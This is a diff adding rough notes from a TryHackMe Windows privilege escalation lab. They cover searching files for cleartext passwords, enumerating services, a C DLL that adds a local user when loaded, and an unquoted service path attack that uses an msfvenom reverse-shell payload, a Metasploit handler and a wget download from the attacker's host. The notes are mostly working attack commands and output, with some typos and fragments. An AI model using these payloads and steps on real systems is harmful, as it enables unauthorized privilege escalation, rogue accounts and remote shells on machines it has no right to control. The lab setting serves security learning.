@@ -1,0 +1,183 @@
+#Task 2
+Searching files
+
+Configuration files of software installed on the target system can sometimes provide us with cleartext passwords. On the other hand, some computer users have the unsafe habit of creating and using files to remember their passwords (e.g. passwords.txt). Finding these files can shorten your path to administrative rights or even easy access to other systems and software on the target network.
+
+
+The findstr command can be used to find such files in a format similar to the one given below:
+
+
+findstr /si password *.txt
+
+
+Command breakdown:
+
+findstr: Searches for patterns of text in files.
+
+/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)
+
+password: The command will search for the string “password” in files
+
+*.txt: The search will cover files that have a .txt extension
+
+
+
+net user
+
+systeminfo
+
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+
+sc query windefend
+
+SERVICE_NAME: windefend
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 1077  (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+
+
+wmic service list brief | findstr  "Running"
+
+earchsploit fitbit                 
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                        |  Path
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Fitbit Connect Service - Unquoted Service Path Privilege Escalation                                                   | windows/local/40482.txt
+---------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+                                                                                                                                                        
+┌──(root💀lucy)-[/home/gd/Desktop/THM/Winpriviesc]
+└─# searchsploit -m windows/local/40482.txt
+
+Exploit: Fitbit Connect Service - Unquoted Service Path Privilege Escalation
+      URL: https://www.exploit-db.com/exploits/40482
+     Path: /usr/share/exploitdb/exploits/windows/local/40482.txt
+File Type: ASCII text
+
+Copied to: /home/gd/Desktop/THM/Winpriviesc/40482.txt
+
+
+answer:Unquoted Service Path
+
+sc qc "Fitbit connect"
+
+
+apt install gcc-mingw-w64-x86-64
+vi win_dll.c
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
+    if (dwReason == DLL_PROCESS_ATTACH) {
+        system("cmd.exe /k net user jack Password11");
+        ExitProcess(0);
+    }
+    return TRUE;
+}
+
+
+ps:>wget -O hijackme.dll http://10.10.172.64:8000/hjack.dll
+
+x86_64-w64-mingw32-gcc hijackme.c -shared -o hijackme.dll
+
+sc stop dllsvc & sc start dllsvc
+
+runas /noprofile /user:Jack-DLL\jack cmd
+
+c:\Users\jack\Documents>type flagdll.txt
+THM-8377492093
+
+find
+
+
+C:\Users\user>sc qc unquotedsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: unquotedsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : Unquoted Path Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+        
+.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
+Accesschk v6.10 - Reports effective permissions for securable objects
+Copyright (C) 2006-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Program Files
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+
+
+.\accesschk64.exe /accepteula -uwdq  C:\Program Files\Unquoted Path Service\
+  Accesschk v6.10 - Reports effective permissions for securable objects
+Copyright (C) 2006-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+C:\Program Files\Unquoted Path Service
+  RW BUILTIN\Users
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+  
+  
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.176.180 LPORT=1235 -f exe >common.exe
+
+msf6 > use exploit/multi/handler 
+[*] Using configured payload windows/x64/shell_reverse_tcp
+msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
+payload => windows/x64/shell_reverse_tcp
+msf6 exploit(multi/handler) > set lport 8899
+lport => 8899
+msf6 exploit(multi/handler) > set lhost 10.10.176.180
+lhost => 10.9.6.195
+msf6 exploit(multi/handler) > run
+
+PS C:\Users\user\Downloads wget -O hell.exe 10.10.176.180:8000/common.exe
+copy file common.exe to C:\Program Files\Unquoted Path Service\
+
+sc query unquotedsvc
+SERVICE_NAME: unquotedsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED
+        WIN32_EXIT_CODE    : 1077  (0x435)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x0
+
+C:\Users\user\Desktop>sc start unquotedsvc
+
+On kali machine
+metesploit
+c:\Users>dir /s flagUSP.txt
+dir /s flagUSP.txt
+ Volume in drive C has no label.
+ Volume Serial Number is A8A4-C362
+
+ Directory of c:\Users\Cora\Documents
+
+10/14/2021  11:54 PM                16 flagUSP.txt
+               1 File(s)             16 bytes
+
+     Total Files Listed:
+               1 File(s)             16 bytes
+               0 Dir(s)  14,864,113,664 bytes free
+
+c:\Users>type c:\Users\Cora\Documents\flagUSP.txt
+type c:\Users\Cora\Documents\flagUSP.txt
+THM-636729273483
+
+https://tryhackme.com/room/winprivesc
+https://www.youtube.com/watch?v=VlRox0GmOzU&list=PLqM63j87R5p4yWMhmzX1kBvg6yAdQNp1W&index=2
